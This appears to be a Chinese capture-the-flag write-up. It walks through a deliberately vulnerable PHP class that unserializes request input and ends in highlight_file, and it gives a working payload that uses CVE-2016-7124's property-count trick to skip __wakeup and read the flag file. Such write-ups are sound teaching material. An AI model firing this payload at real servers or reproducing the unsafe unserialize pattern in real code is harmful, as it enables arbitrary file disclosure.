---
tags:
  - "#wakeup"
  - "#反序列化"
  - "#web"
date: 2026-09-23 11:50
author: 冰冰洁
---
# 题目解析

```php
<?php  
class X  
{  
    public $x = __FILE__;  // 当前文件路径
    function __construct($x)  
    {        $this->x = $x;  
    }  
    function __wakeup()  
    {  
        if ($this->x !== __FILE__) {            $this->x = __FILE__;  
        }  
    }  
    function __destruct()  
    {        highlight_file($this->x);        //flag is in fllllllag.php    }  
}  
if (isset($_REQUEST['x'])) {  
    @unserialize($_REQUEST['x']);  
} else {    highlight_file(__FILE__);  
}
```

可以看到最开始该题目给x附了一个当前文件路径的值

然后又将类中的x属性的值给到x

但在`wakeup`中又判断如果不等于`file`则重新给x赋值

## 漏洞利用

于是我们本题的目标就是要将x的值给成`fllllllag.php `

因此使用当一个类标明的属性数量与实际属性数量不同来绕过`wakeup`这个函数：

```
O:1:"X":6:{s:1:"x";s:13:"fllllllag.php";}
```

得到flag：

![[Pasted image 20260923113306.png]]、
## 知识点

### php中的魔术常量

| 魔术常量            | 含义                | 示例                        |
| --------------- | ----------------- | ------------------------- |
| `__FILE__`      | **当前文件的完整路径和文件名** | `/var/www/html/index.php` |
| `__DIR__`       | **当前文件所在目录**      | `/var/www/html`           |
| `__LINE__`      | **当前代码所在的行号**     | `15`                      |
| `__FUNCTION__`  | **当前函数名称**        | `test`                    |
| `__CLASS__`     | **当前类名称**         | `User`                    |
| `__METHOD__`    | **当前类方法名称**       | `User::login`             |
| `__NAMESPACE__` | **当前命名空间名称**      | `App\Controller`          |
| `__TRAIT__`     | **当前 Trait 名称**   | `LogTrait`                |

### wakeup绕过方法

在 PHP 反序列化中，`__wakeup()` 会在 `unserialize()` 后自动调用，因此有些题目会利用 **属性数量与实际序列化属性数量不一致** 来绕过它：当序列化字符串中的属性数量大于类中实际定义的属性数量时，在某些 PHP 版本中会触发 `__wakeup()` 绕过（经典的 **CVE-2016-7124**），从而使对象能够继续进入 `__destruct()` 等后续流程。简单理解就是：**通过修改序列化字符串中的对象属性计数，让 PHP 在反序列化过程中跳过 `__wakeup()`，但仍然完成对象构造，从而达到绕过检查的效果**。